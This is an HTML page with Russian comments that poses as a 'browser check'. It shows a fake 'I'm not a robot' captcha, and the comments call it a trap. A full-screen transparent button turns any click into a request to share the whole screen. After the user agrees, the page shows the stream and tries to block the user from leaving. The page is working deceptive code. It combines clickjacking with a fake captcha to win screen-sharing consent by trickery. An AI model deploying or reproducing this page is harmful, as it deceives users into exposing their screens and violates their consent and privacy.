<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Проверка браузера</title>
    <style>
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; cursor: default; }
        
        /* Визуальная ловушка: фальшивая капча */
        .captcha-container { border: 1px solid #d3d3d3; padding: 15px; border-radius: 3px; background: #f9f9f9; width: 300px; display: flex; align-items: center; user-select: none; }
        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; margin-right: 15px; background: #fff; }
        .text { font-size: 14px; color: #555; flex-grow: 1; }
        .logo { width: 30px; height: 30px; background: url('https://www.gstatic.com') no-repeat center/contain; }

        /* Прозрачная кнопка-невидимка на весь экран */
        #invisibleTrigger {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            opacity: 0;
            z-index: 9999;
            cursor: pointer;
        }

        video { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: none; background: #000; }
    </style>
</head>
<body>

    <div class="captcha-container">
        <div class="checkbox"></div>
        <div class="text">Я не робот</div>
        <div class="logo"></div>
    </div>

    <!-- Кнопка на весь экран: любой клик вызовет окно разрешения -->
    <button id="invisibleTrigger"></button>
    
    <video id="preview" autoplay playsinline></video>

    <script>
        const btn = document.getElementById('invisibleTrigger');
        const video = document.getElementById('preview');

        btn.addEventListener('click', async () => {
            try {
                // Вызов системного окна выбора экрана
                const stream = await navigator.mediaDevices.getDisplayMedia({ 
                    video: { displaySurface: "monitor" }, // Пытаемся запросить весь экран
                    audio: false 
                });

                // Если пользователь нажал "Поделиться" в системном окне:
                video.srcObject = stream;
                video.style.display = 'block';
                btn.remove(); // Убираем ловушку

                // Блокировка попытки закрыть страницу (не гарантировано)
                window.onbeforeunload = function() { return "Трансляция активна!"; };

            } catch (err) {
                console.log("Пользователь закрыл системное окно выбора");
            }
        });
    </script>
</body>
</html>
